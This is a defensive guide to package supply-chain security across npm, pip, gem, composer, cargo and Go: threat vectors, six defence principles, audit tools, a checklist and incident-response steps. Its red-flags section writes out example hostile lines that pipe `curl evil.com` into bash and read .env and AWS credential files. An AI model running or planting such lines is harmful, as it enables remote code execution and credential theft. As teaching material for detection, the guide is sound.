# Package Security Principles - Universal Guide

**For:** Protecting your projects from malicious packages across ALL languages

**Applies to:** JavaScript, Python, Ruby, PHP, Rust, Go, Java, and more

---

## 🎯 Why Package Security Matters

Package managers (NPM, pip, gem, composer, cargo, etc.) are critical to modern development, but they've become major attack vectors for supply chain attacks.

### Real-World Incidents (Factual)

**These attacks actually happened:**

1. **event-stream (NPM, 2018)**
   - Popular package (2M weekly downloads) compromised
   - Malicious code added to steal Bitcoin wallet credentials
   - Affected thousands of projects

2. **ctx & php (Python PyPI, 2022)**
   - Typosquatting attack mimicking legitimate packages
   - Exfiltrated AWS credentials and environment variables
   - Discovered after widespread installation

3. **rest-client (Ruby, 2019)**
   - Compromised maintainer account
   - Backdoor inserted to steal credentials
   - Removed after community discovery

4. **SolarWinds (Commercial, 2020)**
   - Supply chain attack via build process
   - Demonstrated severity of dependency compromise
   - Affected major organizations globally

**Key Takeaway:** Supply chain attacks affect ALL ecosystems. The principles below apply universally.

---

## 🚨 Universal Threat Vectors

These attack patterns work across ALL package managers:

### 1. Typosquatting

**What it is:** Creating packages with names similar to popular packages

**Examples:**
- `tensorflow` vs `tensorf1ow` (1 → l)
- `requests` vs `reqeusts` (transposed letters)
- `lodash` vs `loadsh` (missing letter)

**Why it works:** Developers make typos when installing packages

---

### 2. Dependency Confusion

**What it is:** Exploiting how package managers resolve internal vs public packages

**How it works:**
1. Attacker discovers internal package name (e.g., `company-utils`)
2. Publishes malicious package with same name to public registry
3. Package manager installs public version instead of internal

**Affected ecosystems:** NPM, pip, NuGet, Maven

---

### 3. Malicious Install/Build Scripts

**What it is:** Code that runs automatically during package installation

**Examples:**
- `postinstall` scripts (NPM)
- `setup.py` execution (Python)
- Gem extensions (Ruby)
- Composer scripts (PHP)

**What malware does:**
- Steal environment variables (.env files)
- Exfiltrate source code
- Install cryptocurrency miners
- Create backdoors

---

### 4. Compromised Maintainer Accounts

**What it is:** Attackers gain access to legitimate package maintainer accounts

**How it happens:**
- Phishing attacks
- Weak/reused passwords
- Session hijacking
- Social engineering

**Result:** Malicious code inserted into trusted packages

---

### 5. Backdoored Dependencies

**What it is:** Malware hidden deep in dependency trees

**Challenge:** You trust Package A, but Package A depends on Package B, which depends on compromised Package C

**Example:** event-stream depended on compromised `flatmap-stream`

---

## 🛡️ Six Universal Defense Principles

These principles apply to **every package manager**. Adapt the specific commands to your ecosystem.

### Principle 1: Verify Before Install

**Never install packages blindly.** Always check:

✅ **Reputation indicators:**
- Weekly download count (higher = more scrutiny)
- GitHub stars (if open source)
- Active maintenance (recent updates)
- Verified publishers/authors

✅ **Red flags:**
- Very low downloads (< 100/week for new packages)
- No documentation or repository link
- Recently created with sudden high downloads
- Similar name to popular package

**How to check:**

| Language | Command |
|----------|---------|
| NPM | `npm view package-name` |
| Python | `pip show package-name` |
| Ruby | `gem info package-name` |
| PHP | `composer show package-name` |
| Rust | `cargo search package-name` |
| Go | Check pkg.go.dev/package-name |

---

### Principle 2: Block Automatic Script Execution

**Most malware runs via install scripts.** Block them by default.

**Configuration per ecosystem:**

| Ecosystem | Package Manager | Configuration File | Setting |
|-----------|-----------------|-------------------|---------|
| JavaScript | NPM | `.npmrc` | `ignore-scripts=true` |
| JavaScript | Yarn | `.yarnrc` | `--ignore-scripts` flag |
| Python | pip | `pip.conf` | `only-binary=:all:` (prefer wheels) |
| Python | poetry | `pyproject.toml` | No install hooks by default |
| Ruby | gem | `.gemrc` | `install: --trust-policy MediumSecurity` |
| PHP | composer | `composer.json` | `"scripts": {}` (empty) |
| Rust | cargo | N/A | No install scripts (safe by default) |
| Go | go modules | N/A | No install scripts (safe by default) |

**Note:** Some legitimate packages need install scripts (e.g., puppeteer, node-gyp). Whitelist individually:

```bash
# NPM example
npm install package-name --ignore-scripts=false

# Python example (allow source build for specific package)
pip install package-name --no-binary package-name
```

---

### Principle 3: Lock Dependencies

**Lockfiles ensure reproducible, tamper-proof installs.**

**Why lockfiles matter:**
- Prevent automatic updates that could introduce malware
- Verify package integrity via checksums
- Enable exact version reproduction

**Lockfile per ecosystem:**

| Ecosystem | Lockfile | Commit to Git? |
|-----------|----------|----------------|
| JavaScript (NPM) | `package-lock.json` | ✅ YES |
| JavaScript (Yarn) | `yarn.lock` | ✅ YES |
| Python (pip) | `requirements.txt` + hashes | ✅ YES |
| Python (poetry) | `poetry.lock` | ✅ YES |
| Ruby | `Gemfile.lock` | ✅ YES |
| PHP | `composer.lock` | ✅ YES |
| Rust | `Cargo.lock` | ✅ YES |
| Go | `go.sum` | ✅ YES |

**ALWAYS commit lockfiles to version control.**

---

### Principle 4: Regular Audits

**Automate vulnerability scanning.**

**Audit tools per ecosystem:**

| Ecosystem | Built-in Tool | Third-Party Tools |
|-----------|---------------|-------------------|
| JavaScript | `npm audit` | Snyk, Socket Security |
| Python | `pip-audit` | Safety, Snyk |
| Ruby | `bundle audit` | bundler-audit |
| PHP | `composer audit` | Roave Security Advisories |
| Rust | `cargo audit` | RustSec Advisory DB |
| Go | `govulncheck` | Nancy, Snyk |

**Recommended frequency:**
- **Before install:** Always
- **Weekly:** Automated scans
- **On PR:** CI/CD integration

---

### Principle 5: Minimal Dependencies

**Fewer dependencies = smaller attack surface.**

**Strategies:**
- Evaluate if you really need a package (avoid "left-pad" syndrome)
- Prefer standard library over third-party when possible
- Remove unused dependencies regularly

**Detection tools:**

| Language | Tool | Command |
|----------|------|---------|
| JavaScript | depcheck | `npx depcheck` |
| Python | pip-autoremove | `pip-autoremove package-name` |
| Ruby | bundle-audit | `bundle clean` |
| PHP | composer-unused | `composer unused` |

---

### Principle 6: Source Code Inspection

**For critical dependencies, inspect the source before installing.**

**Download without installing:**

| Ecosystem | Command |
|-----------|---------|
| NPM | `npm pack package-name` |
| Python | `pip download package-name --no-deps` |
| Ruby | `gem fetch package-name` |
| PHP | `composer archive package-name` |
| Rust | Check GitHub directly (most crates link source) |
| Go | `go mod download` |

**What to look for:**
- Obfuscated code (base64, eval, hex strings)
- Unexpected network calls
- File system manipulation
- Suspicious install scripts

**Red flags in code:**
```javascript
// NPM example - suspicious patterns
eval(atob("base64encodedcode")); // Decoding + executing code
require('child_process').exec('curl evil.com | bash'); // Remote execution
fs.readFileSync('.env'); // Credential theft
```

```python
# Python example - suspicious patterns
exec(__import__('base64').b64decode('...')) # Obfuscation
os.system('curl evil.com | bash') # Remote execution
open(os.path.expanduser('~/.aws/credentials')) # Credential theft
```

---

## 📊 Package Manager Comparison Table

Quick reference for adapting these principles to your language:

| Ecosystem | Package Manager | Lockfile | Audit Tool | Script Blocking | Registry |
|-----------|-----------------|----------|------------|-----------------|----------|
| JavaScript | NPM | package-lock.json | npm audit | ignore-scripts | npmjs.org |
| JavaScript | Yarn | yarn.lock | yarn audit | --ignore-scripts | npmjs.org |
| JavaScript | pnpm | pnpm-lock.yaml | pnpm audit | --ignore-scripts | npmjs.org |
| Python | pip | requirements.txt | pip-audit | --only-binary | pypi.org |
| Python | poetry | poetry.lock | poetry check | (none needed) | pypi.org |
| Ruby | gem/bundler | Gemfile.lock | bundle audit | --trust-policy | rubygems.org |
| PHP | composer | composer.lock | composer audit | --no-scripts | packagist.org |
| Rust | cargo | Cargo.lock | cargo audit | (none needed) | crates.io |
| Go | go modules | go.sum | govulncheck | (none needed) | pkg.go.dev |
| Java | Maven | pom.xml | mvn dependency-check | (configurable) | maven.org |
| .NET | NuGet | packages.lock.json | dotnet list package --vulnerable | (none needed) | nuget.org |

---

## ✅ Universal Security Checklist

Adapt these steps to your language ecosystem:

### Before Installing ANY Package

- [ ] **Check reputation**
  - Download count > 1,000/week
  - Active maintenance (updated in last 6 months)
  - Verified publisher/maintainer
  - Public source repository available

- [ ] **Search for known issues**
  - Google: "package-name security vulnerability"
  - Check CVE databases
  - Review package issue tracker

- [ ] **Inspect install scripts**
  - Check package.json / setup.py / gem build for suspicious commands
  - Look for network calls, file system access
  - Verify scripts match documentation

- [ ] **Run audit before install**
  - Use ecosystem-specific audit tool
  - Review any warnings/vulnerabilities
  - Check transitive dependencies

### Project Configuration

- [ ] **Enable lockfile**
  - Create lockfile on first install
  - Commit lockfile to version control
  - Keep lockfile in sync with dependencies

- [ ] **Block automatic scripts**
  - Configure package manager to ignore install scripts
  - Whitelist individual packages as needed

- [ ] **Use official registry only**
  - Configure package manager to use official source
  - Avoid mirror registries unless explicitly trusted

- [ ] **Pin versions**
  - Use exact versions (not ranges) in production
  - Test updates in development first

### Ongoing Maintenance

- [ ] **Weekly security audits**
  - Run audit tool weekly
  - Review and address vulnerabilities
  - Update dependencies carefully

- [ ] **Monthly dependency review**
  - Check for outdated packages
  - Review changelogs before updating
  - Remove unused dependencies

- [ ] **Monitor security advisories**
  - Subscribe to security mailing lists
  - Follow package manager security blogs
  - Enable automated alerts (GitHub Dependabot, Snyk, etc.)

---

## 🚨 Incident Response (Universal)

### If You Discover a Compromised Package

**Immediate Actions (First 5 minutes):**

1. **Isolate the environment**
   ```bash
   # Stop all running processes
   pkill -f <your-app-name>

   # Disconnect from network (if possible)
   ```

2. **Identify the scope**
   - When was the package installed?
   - What did it access?
   - Which projects are affected?

3. **Remove the malicious package**
   ```bash
   # NPM
   npm uninstall malicious-package

   # Python
   pip uninstall malicious-package

   # Ruby
   gem uninstall malicious-package

   # PHP
   composer remove malicious-package
   ```

**Investigation (Next 30 minutes):**

4. **Check for damage**
   ```bash
   # Look for new/modified files
   find . -type f -mtime -1

   # Check environment variables
   env | grep -i key

   # Review git history
   git diff HEAD~1
   ```

5. **Assess data exposure**
   - Were .env files accessed?
   - Were API keys transmitted?
   - Was source code exfiltrated?
   - Were credentials compromised?

**Recovery (Next 24-48 hours):**

6. **Rotate all credentials**
   - API keys
   - Database passwords
   - SSH keys
   - OAuth tokens
   - Service account credentials

7. **Report the incident**
   - Package registry security team (security@npmjs.com, etc.)
   - Package maintainer (if account compromised)
   - Your security team/manager
   - Affected downstream users (if you published packages)

8. **Document and learn**
   - Write incident report
   - Update security policies
   - Share lessons learned with team
   - Improve detection mechanisms

---

## 🔗 Resources by Ecosystem

### JavaScript (NPM)
- [NPM Security Best Practices](https://docs.npmjs.com/security-best-practices)
- [Socket.dev - Real-time NPM monitoring](https://socket.dev/)
- [Snyk NPM Advisor](https://snyk.io/advisor/)

### Python (pip/poetry)
- [PyPI Security](https://pypi.org/security/)
- [pip-audit Documentation](https://github.com/pypa/pip-audit)
- [Python Package Index Security](https://warehouse.pypa.io/security.html)

### Ruby (gem)
- [RubyGems Security Guide](https://guides.rubygems.org/security/)
- [bundler-audit](https://github.com/rubysec/bundler-audit)

### PHP (composer)
- [Packagist Security](https://packagist.org/about)
- [Roave Security Advisories](https://github.com/Roave/SecurityAdvisories)

### Rust (cargo)
- [RustSec Advisory Database](https://rustsec.org/)
- [cargo-audit](https://github.com/RustSec/rustsec/tree/main/cargo-audit)

### Go (modules)
- [Go Vulnerability Database](https://vuln.go.dev/)
- [govulncheck](https://pkg.go.dev/golang.org/x/vuln/cmd/govulncheck)

### Universal Resources
- [OWASP Top 10 for LLM/Supply Chain](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [Snyk - Multi-language security](https://snyk.io/)
- [GitHub Dependabot](https://docs.github.com/en/code-security/dependabot)

---

## 🎯 Language-Specific Implementation Guides

This document covered universal principles. For detailed, language-specific implementation:

- **JavaScript (NPM):** See [NPM Security Checklist](./03_npm-security-checklist.md) and [NPM Security Guide](./04_npm-security-guide.md)
- **Python (pip/poetry):** See [Python Security Checklist](./03_python-security-checklist.md) and [Python Security Guide](./05_python-security-guide.md)
- **Other languages:** Apply the universal principles above to your ecosystem

---

## 💡 Key Takeaways

1. ✅ **Supply chain attacks affect ALL ecosystems** - not just JavaScript
2. ✅ **Principles are universal** - adapt commands to your language
3. ✅ **Automation is critical** - manual checks don't scale
4. ✅ **Lockfiles are non-negotiable** - always commit them
5. ✅ **Block scripts by default** - whitelist individually
6. ✅ **Audit regularly** - before install, weekly, on CI/CD
7. ✅ **Minimize dependencies** - fewer packages = smaller attack surface
8. ✅ **Inspect critical code** - don't trust blindly

---

**Remember:** Package security is an ongoing process, not a one-time setup. Stay vigilant!

**Last Updated:** 2025-12-09
**Version:** 1.0
**Applies to:** All package managers and ecosystems
